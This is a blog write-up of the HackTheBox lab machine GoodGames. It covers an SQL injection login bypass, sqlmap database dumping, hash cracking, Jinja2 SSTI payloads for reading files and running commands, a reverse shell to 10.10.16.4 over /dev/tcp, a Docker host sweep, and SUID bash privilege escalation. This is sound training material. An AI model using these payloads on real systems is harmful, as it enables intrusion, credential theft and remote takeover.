---
layout: post
title: "GoodGames HTB writeup"
subtitle: "Walkethrough for the GoodGames HTB machine."
date: 2024-11-15 23:45:13
background: '/img/posts/04.jpg'

---

## Report  

We begin with `nmap` as usual.  

```bash
nmap $ip -sV
```

We get some open `ports`.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116115505.png" alt="1" style="width:700px; height:auto;">
<br/>

This time, we get an only open port which is `80`. The only attack vector we have is via `HTTP`. 

We begin by adding `goodgames.htb` to our `/etc/hosts`.   

```bash
sudo nano /etc/hosts
```

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116115647.png" alt="1" style="width:700px; height:auto;">
<br/>

We run a `directory brute forcing` in the background.   

```bash
gobuster dir -u="http://goodgames.htb" -w=/usr/share/seclists/SecLists-master/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php.bak,html,txt,zip,sh  --exclude-length 9265
```

We are welcomed with this `index` page.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116122346.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `login/signup` button.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116122421.png" alt="1" style="width:700px; height:auto;">
<br/>

We `register` an account.   

<mark>Signup:</mark> 

- test@test.com
- xtromera
- Xtromera@123
- Xtromera@123

We `Login` successfully.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116124335.png" alt="1" style="width:700px; height:auto;">
<br/>

Intercepting the `request`, we can see `session cookie`.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116125236.png" alt="1" style="width:700px; height:auto;">
<br/>

It seems to be a `JWT` token.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116125249.png" alt="1" style="width:700px; height:auto;">
<br/>

A lot of attack vectors are present that we can try.   

Whenever we try to change anything in the token, it gives us error `500`.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116130105.png" alt="1" style="width:700px; height:auto;">
<br/>

Lets try `SQL injection` payloads on the `signup` and `login` page. Changing the `email` field with a `SQL injection` payload.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116130255.png" alt="1" style="width:700px; height:auto;">
<br/>


```sql
test%40test.com'OR+1=1+--+-+
```

We get a response  `Welcome adminxtromera` seems that the payload worked. Giving the rest to `sqlmap`. 

```bash
sqlmap -r req --level 3 --risk 3 --batch
```

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116130531.png" alt="1" style="width:700px; height:auto;">
<br/>

We get `2 databases`. 

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116131332.png" alt="1" style="width:700px; height:auto;">
<br/>

We can focus on the `main` database as the other  is a common database in  `MYSQL`.    

```bash
 sqlmap -r req  --batch -D main --tables
```

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116131802.png" alt="1" style="width:700px; height:auto;">
<br/>

We can try to fetch the `user` tables.  

```bash
sqlmap -r req  --batch -D main -T user --dump
```

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116143201.png" alt="1" style="width:700px; height:auto;">
<br/>

We `crack` the `hash` using `hashcat`.  

```bash
hashcat hash /usr/share/wordlists/rockyou.txt -m 0
```

The `password` is cracked.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116145249.png" alt="1" style="width:700px; height:auto;">
<br/>

`admin:superadministrator`

Now we can login as `Administrator`.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116145942.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a `Gear` button on the top right.   Clicking on it, we are redirected to `http://internal-administration.goodgames.htb/`.    
We can add it to `/etc/hosts` and refresh the page.    

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116150550.png" alt="1" style="width:700px; height:auto;">
<br/>

We login with credentials `admin:superadministrator`.    

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116151240.png" alt="1" style="width:700px; height:auto;">
<br/>

We find in the settings that we can update our General information `http://internal-administration.goodgames.htb/settings`.  

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116153832.png" alt="1" style="width:700px; height:auto;">
<br/>

This website is powered by `Flask volt` as it is a `python` library. Maybe it is vulnerable to `SSTI`. We can try some payloads to test for the vulnerability.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116153929.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see using this payload  &#123;&#123;7*7&#125;&#125; that we get an output of `49` meaning the code was handled by the `backend` server and the form is vulnerable.  
The output reveals that the template used is 90% `Jinja2` so we can continue our payloads based on this guess.   

We can use a payload to read `local files` on the system.   

<pre><code>
&#123;&#123; get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() &#125;&#125;
</code></pre>

We get a hit. 

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116154745.png" alt="1" style="width:700px; height:auto;">
<br/>

Now we can use an `RCE` payload.  

<pre><code>
&#123;&#123; cycler.__init__.__globals__.os.popen(&#39;id&#39;).read() &#125;&#125;
</code></pre>

we get a nice output. 

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116155123.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see us being `root` so must propably a container.  
We can now execute our `rev shell` payload.   

<pre><code>
&#123;&#123;+cycler.__init__.__globals__.os.popen(&#39;bash+-c+&#34;sh+-i+&#62;&#38;+/dev/tcp/10.10.16.4/4444+0&#62;&#38;1&#34;&#39;).read()+&#125;&#125;
</code></pre>

We get a hit.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116155347.png" alt="1" style="width:700px; height:auto;">
<br/>

This seems to be a `container`.    

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116155410.png" alt="1" style="width:700px; height:auto;">
<br/>

We are now sure to be in a `Docker`.    
A quick `host sweep`, we check for live hosts.   

```bash
for ip in {1..254}; do ping -c 1 172.19.0.$ip | grep "64 bytes";done
```

We get `2` live hosts, our and another one `172.19.0.1`.  
Now we do a `port` sweep to check open ports.   

```bash
for port in {1..65535}; do (echo > /dev/tcp/172.19.0.2/$port) >/dev/null 2>&1 && echo "Port $port is open"; done
```

We get some ports open.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116170527.png" alt="1" style="width:700px; height:auto;">
<br/>

We saw when enumerating in the `/home` directory a directory called `augustus` although the user is not present in the `/etc/passwd` file so this means that the `/home` directory is mounted from the original `host` machine on the docker container.  
As we are `root`, and the port `22` is open on the host machine, `SSH` is available so we can `ssh` to the host machine by abusing the write permissions we have in the `home` directory of the user and authenticate via `private RSA key`.   

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa
```


<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116171940.png" alt="1" style="width:700px; height:auto;">
<br/>

Now we can `SSH` to the host.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116172325.png" alt="1" style="width:700px; height:auto;">
<br/>

If we remember, the `/home/augustus` directory is mounted on the `docker` where we have `root` privileges.  
We can copy `/bin/bash` file to the home directory of the user, add the `SUID` privilege and let `augustus` executes it in `goodgames` host.   


<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116174958.png" alt="1" style="width:700px; height:auto;">
<br/>

Doing so, we get an error but because we where trying to copy the `/bin/bash` file from the container to the host but it will work if we copied the `bash` file from the host directly.   
<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116175357.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was `pawned` successfully.   

<br/> 
<img src="/img/GoodGames_screenshots/Pasted image 20241116175429.png" alt="1" style="width:700px; height:auto;">
<br/>

